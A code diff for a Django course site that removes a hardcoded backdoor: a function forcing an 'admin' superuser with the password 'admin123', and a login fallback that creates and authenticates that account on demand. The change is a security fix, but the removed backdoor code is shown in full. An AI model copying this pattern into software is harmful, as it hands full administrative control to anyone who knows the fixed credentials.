@@ -2,7 +2,6 @@ from django import forms
 from django.contrib import messages
 from django.contrib.auth import authenticate, login, logout
 from django.contrib.auth.decorators import login_required, user_passes_test
-from django.contrib.auth.models import User
 from django.db import transaction
 from django.db.models import Prefetch
 from django.shortcuts import get_object_or_404, redirect, render
@@ -111,27 +110,6 @@ class AnnouncementForm(forms.ModelForm):
         }
 
 
-def ensure_default_staff_user():
-    user, created = User.objects.get_or_create(username='admin')
-    if created:
-        user.set_password('admin123')
-        user.is_staff = True
-        user.is_superuser = True
-        user.save()
-        return user
-
-    if not user.is_staff or not user.is_superuser:
-        user.is_staff = True
-        user.is_superuser = True
-        user.save()
-
-    if not user.has_usable_password() or not user.check_password('admin123'):
-        user.set_password('admin123')
-        user.save()
-
-    return user
-
-
 def get_public_courses():
     return Course.objects.filter(is_published=True).order_by('display_order', 'title')
 
@@ -189,10 +167,6 @@ def staff_login(request):
         password = request.POST.get('password') or ''
 
         user = authenticate(request, username=username, password=password)
-        if user is None and username == 'admin' and password == 'admin123':
-            user = ensure_default_staff_user()
-            user = authenticate(request, username='admin', password='admin123')
-
         if user is not None:
             login(request, user)
             return redirect('admin_dashboard')
